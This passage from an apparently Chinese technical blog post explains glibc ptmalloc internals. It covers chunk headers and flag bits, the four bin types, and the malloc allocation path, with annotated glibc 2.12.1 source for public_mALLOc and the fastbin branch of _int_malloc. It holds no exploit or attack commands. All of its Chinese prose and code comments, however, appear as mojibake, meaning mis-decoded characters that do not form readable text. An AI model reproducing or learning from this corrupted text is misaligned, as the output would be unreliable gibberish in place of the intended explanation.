+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">            |             User data starts here...                          .</span><br><span class="line">            .                                                               .</span><br><span class="line">            .             (malloc_usable_size() bytes)                      .</span><br><span class="line">            .                                                               |</span><br><span class="line">nextchunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">            |             (size of chunk, but used for application data)    |</span><br><span class="line">            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">            |             Size of next chunk, in bytes                |A|0|1|</span><br><span class="line">            +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure></div>

<p>éœ€è¦æ³¨æ„ size æ ‡å¿—ä½çš„æœ€ä½ä¸‰ä½ Aã€Mã€Pï¼Œç”±äºå¯¹é½çš„åŸå› ï¼Œå¦‚æœæŠŠ size è½¬æ¢æˆäºŒè¿›åˆ¶ï¼Œå®ƒçš„æœ€ä½ä¸‰ä¸ª bit å§‹ç»ˆéƒ½æ˜¯ 0ï¼Œæ‰€ä»¥å®ƒä»¬å°±æœ‰äº†æ–°çš„ç”¨é€”ã€‚</p>
<p>A(NON_MAIN_ARENA) ç”¨æ¥è¡¨ç¤ºå½“å‰å †å—æ˜¯å¦å±äº main_arenaï¼ŒM(IS_MAPPED)ç”¨æ¥è¡¨ç¤ºå½“å‰å †å—æ˜¯å¦ç”± mmap åˆ†é…ï¼ŒP(PREV_INUSE)æ˜¯æœ€ä¸ºå¸¸ç”¨çš„æ ‡å¿—ä½ï¼Œç”¨æ¥è¡¨ç¤ºå½“å‰å †å—çš„å‰ä¸€ä¸ªå †å—æ˜¯å¦ç©ºé—²ã€‚</p>
<h3 id="bins"><a href="#bins" class="headerlink" title="bins"></a>bins</h3><p>æ¥ä¸‹æ¥æ˜¯é“¾è¡¨çš„åˆ†ç±»ï¼Œå‰é¢æåˆ°ä¸ºäº†åŠ å¿«å†…å­˜åˆ†é…æ•ˆç‡ï¼Œptmalloc å¼•å…¥äº†ç¼“å†²åŒºï¼ŒæŠŠè¾ƒå°çš„å †å—ä¿å­˜åœ¨ç¼“å†²åŒºä¸­ï¼Œè¿™æ ·å°±å¯ä»¥å‡å°‘å’Œæ“ä½œç³»ç»Ÿç”³è¯·å†…å­˜çš„æ¬¡æ•°ï¼Œæé«˜æ•ˆç‡ã€‚ç¼“å†²åŒºæœ‰ä¸€å®šçš„æ ¼å¼ï¼ŒæŒ‰ç…§å †å—çš„å¤§å°åˆ†æˆäº† 4 ç±»å³ fastbinã€smallbinã€largebinã€unsortedbinã€‚</p>
<p>ç¬¬ä¸€ç±»æ˜¯ fastbin chunkï¼Œå®ƒçš„åŸºæœ¬ç»“æ„å¦‚ä¸‹</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">+-----------------+-----------------+</span><br><span class="line">|                 |                 |</span><br><span class="line">|     prev_size   |      size       |</span><br><span class="line">|                 |                 |</span><br><span class="line">+-----------------------------------+</span><br><span class="line">|                 |                 |</span><br><span class="line">|        fd       |                 |</span><br><span class="line">|                 |                 |</span><br><span class="line">+-----------------+                 |</span><br><span class="line">|                                   |</span><br><span class="line">|            user data              |</span><br><span class="line">|                                   |</span><br><span class="line">+-----------------------------------+</span><br></pre></td></tr></table></figure></div>

<p>fastbin chunk çš„å¤§å°é™åˆ¶åœ¨ 0x10 ~ 0x40(0x20 ~ 0x80 if OS is 64 bit)ï¼Œè¿™äº› chunk é€šè¿‡ fd è¿æ¥æˆä¸€æ¡å•å‘é“¾è¡¨ï¼Œåœ¨ä¸»åˆ†é…åŒºä¸­å®šä¹‰äº† fastbins æŒ‡é’ˆï¼Œæˆ‘ä»¬å¯ä»¥å°†å®ƒå±•å¼€</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">index         size</span><br><span class="line">fastbinY[0]      0x20</span><br><span class="line">fastbinY[1]      0x30</span><br><span class="line">fastbinY[2]      0x40</span><br><span class="line">fastbinY[3]      0x50</span><br><span class="line">fastbinY[4]      0x60</span><br><span class="line">fastbinY[5]      0x70</span><br><span class="line">fastbinY[6]      0x80</span><br><span class="line">fastbinY[7]      N/A</span><br><span class="line">fastbinY[8]      N/A</span><br><span class="line">fastbinY[9]      N/A</span><br></pre></td></tr></table></figure></div>

<p>æœ€åä¸‰ä¸ªæ˜¯ä¿ç•™é¡¹ï¼Œæš‚æ—¶æ²¡æœ‰ä½¿ç”¨ã€‚</p>
<p>fastbin é¡¾åæ€ä¹‰ï¼Œå®ƒåˆ†é…å †å—çš„é€Ÿåº¦å¾ˆå¿«ï¼Œä¸”ä»…ä»…ä¿å­˜å¾ˆå°çš„å †å—ï¼Œfastbin chunk çš„ä¸¤ä¸ªç‰¹ç‚¹æ˜¯æ²¡æœ‰ bk æŒ‡é’ˆå¹¶ä¸” PREV_INUSE æ ‡å¿—ä½ä¸€å®šæ˜¯ 1ï¼Œä¹Ÿå°±æ˜¯è¯´ fastbin chunk ä¸ä¼šå’Œå…¶ä»–å †å—åˆå¹¶(åœ¨ç‰¹æ®Šæƒ…å†µä¸‹è¿˜æ˜¯ä¼šå‘ç”Ÿåˆå¹¶)ã€‚å¦å¤–ï¼Œfastbin é‡‡ç”¨ LIFO ç­–ç•¥ï¼Œä»å¤´éƒ¨æ’å…¥ï¼Œå¤´éƒ¨å–å‡ºï¼Œè¿™æ ·å¯ä»¥è¿›ä¸€æ­¥æé«˜åˆ†é…æ•ˆç‡ã€‚</p>
<p>é™„ï¼šfastbin é“¾è¡¨å¤§è‡´ç»“æ„</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/malloc_free_2.png"
                      alt="malloc_free_2.png"
                ></p>
<p>ç¬¬äºŒç±»æ˜¯ smallbinï¼Œè¿™ä¹Ÿæ˜¯å¾ˆå¸¸ç”¨çš„é“¾è¡¨ï¼Œsmallbin chunk è¿‘ä¼¼äºä¸€ä¸ªæ ‡å‡†æ ¼å¼çš„ chunkï¼Œç»“æ„å¦‚ä¸‹</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">+-----------------+-----------------+</span><br><span class="line">|                 |                 |</span><br><span class="line">|     prev_size   |      size       |</span><br><span class="line">|                 |                 |</span><br><span class="line">+-----------------------------------+</span><br><span class="line">|                 |                 |</span><br><span class="line">|        fd       |       bk        |</span><br><span class="line">|                 |                 |</span><br><span class="line">+-----------------------------------+</span><br><span class="line">|                                   |</span><br><span class="line">|                                   |</span><br><span class="line">|            user data              |</span><br><span class="line">|                                   |</span><br><span class="line">|                                   |</span><br><span class="line">+-----------------+-----------------+</span><br></pre></td></tr></table></figure></div>

<p>ç›¸æ¯”äº fastbin chunkï¼Œè¿™é‡Œå¤šå‡ºäº† bk æŒ‡é’ˆï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ fd å’Œ bk æŒ‡é’ˆ(ä»¥åŠ fd_nextsizeã€bk_nextsize æŒ‡é’ˆ)éƒ½æ˜¯å¯ä»¥ä½œä¸ºç”¨æˆ·æ•°æ®è¢«è¦†ç›–çš„ï¼Œå®ƒä»¬åªä¼šåœ¨å †å—ç©ºé—²æ—¶å‘æŒ¥ä½œç”¨ã€‚</p>
<p>smallbin çš„èŒƒå›´åœ¨ 0x10 ~ 0x1f0(0x20 ~ 0x3f0 if OS is 64 bit)ï¼Œsmallbin å’Œ fastbin æœ‰ä¸€éƒ¨åˆ†æ˜¯é‡åˆçš„ï¼Œå…¶å® fastbin ä¸­çš„å †å—åœ¨ä¸€å®šæƒ…å†µä¸‹å¯ä»¥è¿›å…¥åˆ° smallbin ä¸­(å½“å‘ç”Ÿ consolidate æ—¶)ã€‚ä¸€äº› smallbin chunk ç›¸äº’ä¸²è”å½¢æˆäº†ä¸€æ¡åŒå‘é“¾è¡¨</p>
<p>é™„ï¼šsmallbin é“¾è¡¨å¤§è‡´ç»“æ„</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/malloc_free_3.png"
                      alt="malloc_free_3.png"
                ></p>
<p>smallbin é“¾è¡¨ä»å¤´éƒ¨æ’å…¥ï¼Œå°¾éƒ¨å–å‡ºã€‚</p>
<p>ç¬¬ä¸‰ç±»æ˜¯ largebinï¼Œä¸“é—¨ç”¨æ¥ä¿å­˜ä¸€äº›è¾ƒå¤§çš„å †å—ï¼ŒèŒƒå›´ä» 0x200 å¼€å§‹ã€‚ä¸€ä¸ª largebin chunk ç»“æ„å¯èƒ½å¦‚ä¸‹</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">+---------------+---------------+</span><br><span class="line">|               |               |</span><br><span class="line">|   prev_size   |    size       |</span><br><span class="line">|               |               |</span><br><span class="line">+-------------------------------+</span><br><span class="line">|               |               |</span><br><span class="line">|      fd       |      bk       |</span><br><span class="line">|               |               |</span><br><span class="line">+-------------------------------+</span><br><span class="line">|               |               |</span><br><span class="line">|   fd_nextsize |  bk_nextsize  |</span><br><span class="line">|               |               |</span><br><span class="line">+---------------+---------------+</span><br><span class="line">|                               |</span><br><span class="line">|                               |</span><br><span class="line">|            user_data          |</span><br><span class="line">|                               |</span><br><span class="line">+-------------------------------+</span><br></pre></td></tr></table></figure></div>

<p>largebinå…±63ä¸ªï¼Œç»„ç»‡æ–¹æ³•å¦‚ä¸‹ï¼š</p>
<p>32ä¸ªbin æ¯64ä¸ªå­—èŠ‚ä¸€ä¸ªé˜¶å±‚ï¼Œæ¯”å¦‚ç¬¬ä¸€ä¸ª512-568å­—èŠ‚ï¼Œç¬¬äºŒä¸ª576 - 632å­—èŠ‚â€¦â€¦</p>
<p>16ä¸ªbin æ¯512å­—èŠ‚ä¸€ä¸ªé˜¶å±‚</p>
<p>8ä¸ªbinæ¯4096å­—èŠ‚ä¸€ä¸ªé˜¶å±‚</p>
<p>4ä¸ªbinæ¯32768å­—èŠ‚ä¸€ä¸ªé˜¶å±‚</p>
<p>2ä¸ªbinæ¯262144å­—èŠ‚ä¸€ä¸ªé˜¶å±‚</p>
<p>æœ€åä¸€ä¸ªbinåŒ…æ‹¬æ‰€æœ‰å‰©ä¸‹çš„å¤§å°ã€‚ä¸åŒäºå…¶ä»–é“¾è¡¨ï¼Œlargebin æ¯ä¸€ä¸ªè¡¨é¡¹ä¿å­˜çš„æ˜¯ä¸€ä¸ªèŒƒå›´ï¼Œæ‰€ä»¥ä¼šç”¨åˆ° fd_nextsize &amp; bk_nextsize æŒ‡é’ˆã€‚fd å’Œ bk æŒ‡é’ˆçš„åŠŸèƒ½å’Œ smallbin çš„ç›¸åŒï¼Œä½†æ˜¯ fd_nextsize &amp; bk_nextsize å°±æœ‰äº›å¤æ‚ï¼Œfd_nextsize æŒ‡å‘ç¬¬ä¸€ä¸ªæ¯”å½“å‰å †å—å¤§çš„å †å—ï¼Œbk_nexisize åä¹‹ã€‚</p>
<p>ç¬¬å››ç±»æ˜¯ unsortedbinï¼Œè¿™ä¸ªé“¾è¡¨æ¯”è¾ƒç‰¹æ®Šï¼Œå®ƒæ²¡æœ‰é’ˆå¯¹å¤§å°è¿›è¡Œæ’åºï¼Œè¿™ä¸€ç‚¹ä»åå­—ä¹Ÿèƒ½çœ‹å‡ºæ¥ï¼Œå®ƒå¯ä»¥è¢«è§†ä¸º smallbin å’Œ largebin çš„ç¼“å†²åŒºï¼Œå½“ç”¨æˆ·é‡Šæ”¾ä¸€ä¸ªå †å—ä¹‹åï¼Œä¼šå…ˆè¿›å…¥ unsortedbinï¼Œå†æ¬¡åˆ†é…å †å—æ—¶ï¼Œptmalloc ä¼šä¼˜å…ˆæ£€æŸ¥è¿™ä¸ªé“¾è¡¨ä¸­æ˜¯å¦å­˜åœ¨åˆé€‚çš„å †å—ï¼Œå¦‚æœæ‰¾åˆ°äº†ï¼Œå°±ç›´æ¥è¿”å›ç»™ç”¨æˆ·(è¿™ä¸ªè¿‡ç¨‹å¯èƒ½ä¼šå¯¹ unsortedbin ä¸­çš„å †å—è¿›è¡Œåˆ‡å‰²)ï¼Œè‹¥æ²¡æœ‰æ‰¾åˆ°åˆé€‚çš„ï¼Œç³»ç»Ÿä¼šæ¸…ç©ºè¿™ä¸ªé“¾è¡¨ï¼Œå°†å †å—æ’å…¥å¯¹åº”çš„é“¾è¡¨ä¸­ã€‚ä¸‹é¢å¼•ç”¨ malloc.c ä¸­çš„æ³¨é‡Š</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Unsorted chunks</span><br><span class="line">    All remainders from chunk splits, as well as all returned chunks,</span><br><span class="line">    are first placed in the &quot;unsorted&quot; bin. They are then placed</span><br><span class="line">    in regular bins after malloc gives them ONE chance to be used before</span><br><span class="line">    binning. So, basically, the unsorted_chunks list acts as a queue,</span><br><span class="line">    with chunks being placed on it in free (and malloc_consolidate),</span><br><span class="line">    and taken off (to be either used or placed in bins) in malloc.</span><br><span class="line">    The NON_MAIN_ARENA flag is never set for unsorted chunks, so it</span><br><span class="line">    does not have to be taken into account in size comparisons.</span><br></pre></td></tr></table></figure></div>

<h3 id="å†…å­˜åˆ†é…æµç¨‹"><a href="#å†…å­˜åˆ†é…æµç¨‹" class="headerlink" title="å†…å­˜åˆ†é…æµç¨‹"></a>å†…å­˜åˆ†é…æµç¨‹</h3><p>å‰ç½®åŸºç¡€çŸ¥è¯†å¤§æ¦‚å°±é‚£äº›ï¼Œè¿˜æœ‰ä¸€éƒ¨åˆ†å…³äºå¤šçº¿ç¨‹çš„ä¸œè¥¿ä¼šæ”¾åœ¨åé¢ï¼Œä¸‹é¢çœ‹ä¸€ä¸‹ malloc çš„åˆ†é…æµç¨‹ï¼Œå½“ç¨‹åºç¬¬ä¸€æ¬¡å¯åŠ¨èµ·æ¥ï¼Œheap å°šæœªåˆå§‹åŒ–ï¼Œè¿™æ—¶å¦‚æœå»è®¿é—® heap ä½ç½®çš„å†…å­˜ä¼šè§¦å‘æ®µé”™è¯¯ï¼Œå…·ä½“åŸå› å’Œä¸Šé¢è¯´çš„ç±»ä¼¼ï¼Œè¿˜æ²¡æœ‰ç»‘å®šç‰©ç†åœ°å€ã€‚</p>
<p>é¦–å…ˆæ‰¾åˆ° malloc å‡½æ•°çš„å…¥å£ï¼Œåœ¨ glibc çš„æºä»£ç ä¸­æ˜¯æ‰¾ä¸åˆ° malloc è¿™ä¸ªå‡½æ•°çš„ï¼Œå½“æ‰§è¡Œ malloc æ—¶æ ¸å¿ƒå‡½æ•°æ˜¯ _int_mallocï¼Œæ–°ç‰ˆæœ¬çš„ glibc ä¿®æ”¹äº† malloc çš„å¤–å£³å‡½æ•°ã€‚ä¸ºäº†æ–¹ä¾¿ï¼Œæš‚æ—¶ä¸åˆ†ææ–°ç‰ˆæœ¬ï¼Œåˆ‡æ¢ glibc åˆ°è€ç‰ˆæœ¬ (2.12.1)ï¼Œå¤–å£³å‡½æ•°ä¸º public_mALLOc()</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">Void_t* <span class="title function_">public_mALLOc</span><span class="params">(<span class="type">size_t</span> bytes)</span></span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  Void_t *victim;</span><br><span class="line"></span><br><span class="line">  <span class="type">__malloc_ptr_t</span> (*hook) (<span class="type">size_t</span>, __const <span class="type">__malloc_ptr_t</span>)</span><br><span class="line">    = force_reg (__malloc_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="number">0</span>));    <span class="comment">// æ£€æŸ¥æ˜¯å¦å­˜åœ¨ hook</span></span><br><span class="line"></span><br><span class="line">  arena_lookup(ar_ptr);</span><br><span class="line">  arena_lock(ar_ptr, bytes);    <span class="comment">// å°è¯•è·å–åˆ†é…åŒºå¹¶åŠ é”</span></span><br><span class="line">  <span class="keyword">if</span>(!ar_ptr)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;    <span class="comment">// å¤±è´¥é€€å‡º</span></span><br><span class="line">  victim = _int_malloc(ar_ptr, bytes);    <span class="comment">// åŠ é”æˆåŠŸï¼Œè°ƒç”¨æ ¸å¿ƒå‡½æ•°åˆ†é…å†…å­˜</span></span><br><span class="line">  <span class="keyword">if</span>(!victim) &#123;    <span class="comment">// å¦‚æœåˆ†é…å¤±è´¥ï¼Œå¯èƒ½æ˜¯ mmap åŒºåŸŸç”¨å…‰äº†</span></span><br><span class="line">    <span class="comment">/* Maybe the failure is due to running out of mmapped areas. */</span></span><br><span class="line">    <span class="keyword">if</span>(ar_ptr != &amp;main_arena) &#123;    <span class="comment">// åˆ¤æ–­å½“å‰åˆ†é…åŒºæ˜¯ä¸æ˜¯ä¸»åˆ†é…åŒº</span></span><br><span class="line">      (<span class="type">void</span>)mutex_unlock(&amp;ar_ptr-&gt;mutex);    <span class="comment">// ä¸æ˜¯ä¸»åˆ†é…åŒºï¼Œ å°†å½“å‰åˆ†é…åŒºè§£é”</span></span><br><span class="line">      ar_ptr = &amp;main_arena;</span><br><span class="line">      (<span class="type">void</span>)mutex_lock(&amp;ar_ptr-&gt;mutex);    <span class="comment">// å°è¯•é”å®šä¸»åˆ†é…åŒº</span></span><br><span class="line">      victim = _int_malloc(ar_ptr, bytes);    <span class="comment">// å†æ¬¡å°è¯•åˆ†é…å†…å­˜</span></span><br><span class="line">      (<span class="type">void</span>)mutex_unlock(&amp;ar_ptr-&gt;mutex);    <span class="comment">// è§£é”ä¸»åˆ†é…åŒº</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;    <span class="comment">// å½“åˆ†é…åŒºæ˜¯ä¸»åˆ†é…åŒºï¼Œå¹¶ä¸”å†…å­˜åˆ†é…å¤±è´¥ï¼Œå¯èƒ½æ˜¯ sbrk å‡ºäº†é—®é¢˜</span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_ARENAS</span></span><br><span class="line">      <span class="comment">/* ... or sbrk() has failed and there is still a chance to mmap() */</span></span><br><span class="line">      ar_ptr = arena_get2(ar_ptr-&gt;next ? ar_ptr : <span class="number">0</span>, bytes);  <span class="comment">// æ£€æŸ¥æ˜¯å¦è¿˜æœ‰éä¸»åˆ†é…åŒº</span></span><br><span class="line">      (<span class="type">void</span>)mutex_unlock(&amp;main_arena.mutex);  <span class="comment">// è§£é”ä¸»åˆ†é…åŒº</span></span><br><span class="line">      <span class="keyword">if</span>(ar_ptr) &#123;    <span class="comment">// å¦‚æœæˆåŠŸæ‰¾åˆ°äº†ä¸€ä¸ªéä¸»åˆ†é…åŒºï¼Œå°±ç»§ç»­å°è¯•åˆ†é…å†…å­˜</span></span><br><span class="line">	victim = _int_malloc(ar_ptr, bytes);</span><br><span class="line">	(<span class="type">void</span>)mutex_unlock(&amp;ar_ptr-&gt;mutex);   <span class="comment">// è§£é”éä¸»åˆ†é…åŒº</span></span><br><span class="line">      &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span></span><br><span class="line">    (<span class="type">void</span>)mutex_unlock(&amp;ar_ptr-&gt;mutex);  <span class="comment">// åˆ†é…ç»“æŸï¼Œè§£é”åˆ†é…åŒºã€‚</span></span><br><span class="line">  assert(!victim || chunk_is_mmapped(mem2chunk(victim)) ||</span><br><span class="line">	 ar_ptr == arena_for_chunk(mem2chunk(victim)));</span><br><span class="line">  <span class="keyword">return</span> victim;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> libc_hidden_def</span></span><br><span class="line">libc_hidden_def(public_mALLOc)</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure></div>

<p>å¤–å£³å‡½æ•°é€»è¾‘æ¯”è¾ƒç®€å•ï¼Œä¸»è¦æ˜¯å¤„ç†åˆ†é…åŒºçš„é—®é¢˜ï¼Œå°½é‡æˆåŠŸåˆ†é…å†…å­˜ç»™ç”¨æˆ·ï¼Œæ¥ä¸‹æ¥æ˜¯æ ¸å¿ƒå‡½æ•° _int_malloc()</p>
<blockquote>
<p>è¡¥ï¼š å…³äº arena çš„é—®é¢˜ï¼Œptmalloc å¯ä»¥æœ‰å¤šä¸ª arenaï¼Œç”¨æ¥ç»™ä¸åŒçš„çº¿ç¨‹ä½¿ç”¨ï¼Œå¤–å£³ä»£ç ä¸­è°ƒç”¨äº† arena_lookup æ¥å¯»æ‰¾ä¸€ä¸ªå¯ç”¨çš„ arenaï¼Œå…¶æµç¨‹å¤§æ¦‚æ˜¯é¦–å…ˆåˆ¤æ–­ä¸€ä¸‹å½“å‰çº¿ç¨‹æœ€åä¸€æ¬¡ä½¿ç”¨çš„ arena æ˜¯å¦ç©ºé—²(å…ˆæŸ¥çœ‹çº¿ç¨‹ç§æœ‰å¯¹è±¡ä¸­æ˜¯å¦å·²ç»å­˜åœ¨ä¸€ä¸ªåˆ†é…åŒº)ï¼Œå¦‚æœä¸æ˜¯ï¼Œå°±å¾ªç¯éå† arena é“¾è¡¨ï¼Œå°è¯•æ‰¾åˆ°ä¸€ä¸ªç©ºé—²çš„ arenaï¼Œå¦‚æœæ‰¾ä¸åˆ°ï¼Œå°±åˆ¤æ–­ä¸€ä¸‹å½“å‰ arena çš„æ€»æ•°ï¼Œè‹¥å°äºæœ€å¤§å€¼ï¼Œå°±åˆ›å»ºä¸€ä¸ªæ–°çš„ arenaï¼Œå¹¶ä¸”æŠŠæ–°çš„ arena æ’å…¥åˆ°å…¨å±€åˆ†é…åŒºå¾ªç¯é“¾è¡¨å¹¶ä¸”åŠ é”ã€‚æ–°å»ºçš„åˆ†é…åŒºä¸€å®šæ˜¯ non_main_arenaï¼Œå› ä¸ºä¸»åˆ†é…åŒºæ˜¯ä»çˆ¶è¿›ç¨‹ç»§æ‰¿çš„ã€‚</p>
</blockquote>
<p>æ ¸å¿ƒå‡½æ•°å¾ˆé•¿ï¼Œå°±ä¸è´´æ‰€æœ‰ä»£ç äº†ï¼Œæœ‰å…´è¶£çš„åŒå­¦å¯ä»¥å»å®˜ç½‘ä¸‹è½½ glibc çš„æºä»£ç ã€‚</p>
<p>é¦–å…ˆæ˜¯å£°æ˜å¿…è¦çš„å˜é‡ï¼Œå°†æ‰€æœ‰è¦ç”¨çš„å˜é‡å£°æ˜åœ¨å‡½æ•°å¤´éƒ¨å¯ä»¥æ–¹ä¾¿åç»­çš„ä¿®æ”¹(æ­¤å¤„ä»£ç ä¸æ¶‰åŠé€»è¾‘)ã€‚</p>
<p>æ¥ç€è°ƒç”¨äº†å‡½æ•°</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">checked_request2size(bytes, nb);</span><br></pre></td></tr></table></figure></div>

<p>bytes æ˜¯ç”¨æˆ·ä¼ å…¥çš„æ•°å­—ï¼Œnb æ˜¯çœŸå® chunk çš„å¤§å°ï¼Œè°ƒç”¨è¿™ä¸ªå‡½æ•°çš„ç›®çš„æ˜¯é€šè¿‡ç”¨æˆ·çš„è¾“å…¥è®¡ç®—å‡ºéœ€è¦åˆ†é…çš„ chunk å¤§å°ã€‚è¿™æ˜¯ç”±äºå¯¹é½çš„åŸå› ï¼Œæ­£å¸¸åˆ†é…çš„ chunk å¹¶ä¸æ˜¯è¾“å…¥çš„å¤§å°æ˜¯å¤šå°‘å°±åˆ†é…å¤šå°‘ï¼Œè€Œæ˜¯ä¼š SIZE å­—èŠ‚å¯¹é½ï¼Œä¾‹å¦‚åœ¨ 64 ä½ç³»ç»Ÿä¸‹ malloc(1)ï¼Œç³»ç»Ÿè¿”å›ç»™æˆ‘ä»¬çš„å †å—å®é™…ä¸Šæœ€å¤šèƒ½å®¹çº³ 16 ä¸ªå­—èŠ‚ã€‚</p>
<p>ä»è¿™é‡Œå¼€å§‹ malloc ä¼šåˆ†æˆ 3 æ¡è·¯ã€‚</p>
<p><strong>ç¬¬ä¸€æ¡ï¼š</strong> å½“ nb å±äº fastbin chunk æ—¶</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    If the size qualifies as a fastbin, first check corresponding bin.</span></span><br><span class="line"><span class="comment">    This code is safe to execute even if av is not yet initialized, so we</span></span><br><span class="line"><span class="comment">    can try it without checking, which saves some time on this fast path.</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)(nb) &lt;= (<span class="type">unsigned</span> <span class="type">long</span>)(get_max_fast ())) &#123;    <span class="comment">// åˆ¤æ–­æ˜¯å¦åœ¨ fastbin èŒƒå›´å†…</span></span><br><span class="line">    idx = fastbin_index(nb);    <span class="comment">// æ ¹æ® nb è®¡ç®—å‡ºåœ¨ fastbin ä¸­çš„ index</span></span><br><span class="line">    mfastbinptr* fb = &amp;fastbin (av, idx);    <span class="comment">// æ ¹æ® index å–ä¸€ä¸ªå †å—(æ— è®ºæ˜¯å¦ä¸ºç©º)</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> ATOMIC_FASTBINS</span></span><br><span class="line">    mchunkptr pp = *fb;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">	victim = pp;</span><br><span class="line">	<span class="keyword">if</span> (victim == <span class="literal">NULL</span>)</span><br><span class="line">	  <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">while</span> ((pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim))</span><br><span class="line">	   != victim);</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">    victim = *fb;    <span class="comment">// å°†å–å‡ºçš„å †å—ç»™ victim</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="keyword">if</span> (victim != <span class="number">0</span>) &#123;    <span class="comment">// åˆ¤æ–­å–å‡ºçš„å †å—æ˜¯å¦ä¸ºç©º</span></span><br><span class="line">      <span class="keyword">if</span> (__builtin_expect (fastbin_index (chunksize (victim)) != idx, <span class="number">0</span>))  <span class="comment">// æ£€æŸ¥å †å—çš„ size</span></span><br><span class="line">	&#123;</span><br><span class="line">	  errstr = <span class="string">&quot;malloc(): memory corruption (fast)&quot;</span>;</span><br><span class="line">	errout:</span><br><span class="line">	  malloc_printerr (check_action, errstr, chunk2mem (victim));</span><br><span class="line">	  <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> ATOMIC_FASTBINS</span></span><br><span class="line">      *fb = victim-&gt;fd;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      check_remalloced_chunk(av, victim, nb); </span><br><span class="line">      <span class="type">void</span> *p = chunk2mem(victim);     <span class="comment">// è¿”å›ç»™ç”¨æˆ·</span></span><br><span class="line">      <span class="keyword">if</span> (__builtin_expect (perturb_byte, <span class="number">0</span>))</span><br><span class="line">	alloc_perturb (p, bytes);</span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></div>

<p>åˆ©ç”¨ fastbinï¼Œé¦–å…ˆæ£€æŸ¥ nb(ä¸Šé¢è®¡ç®—å‡ºçš„çœŸå® chunk å¤§å°)æ˜¯å¦å°äºç­‰äº fastbin çš„æœ€å¤§å€¼ï¼Œå¦‚æœæ˜¯ï¼Œä¼šè¿›å…¥åˆ°ä¸Šé¢çš„ä»£ç é€»è¾‘ä¸­ã€‚è¿™é‡Œåˆ†ä¸ºä¸¤ç§æƒ…å†µï¼Œå¦‚æœæ²¡æœ‰å¼€å¯ ATOMIC_FASTBINS ä¼˜åŒ–åˆ™åˆ†é…è¿‡ç¨‹å¾ˆç®€å•ï¼Œé¦–å…ˆæ ¹æ® nb æ‰¾åˆ°å¯¹åº”çš„ fastbin indexï¼Œæ¥ç€ä»å¯¹åº”çš„é“¾è¡¨ä¸­å–å‡ºä¸€ä¸ªå †å—(å¯èƒ½ä¸ºç©º)ï¼Œåˆ¤æ–­å–å‡ºçš„æ˜¯å¦ä¸ºç©ºï¼Œå¦‚æœä¸ä¸ºç©ºï¼Œè¿›ä¸€æ­¥åˆ¤æ–­æ­¤å †å—çš„ size æ˜¯å¦å’Œ index å¯¹åº”ã€‚å¦‚æœè¿™äº›æ£€æŸ¥éƒ½é€šè¿‡ï¼Œå°±ä¼šæŠŠå †å—è¿”å›ç»™ç”¨æˆ·ã€‚</p>
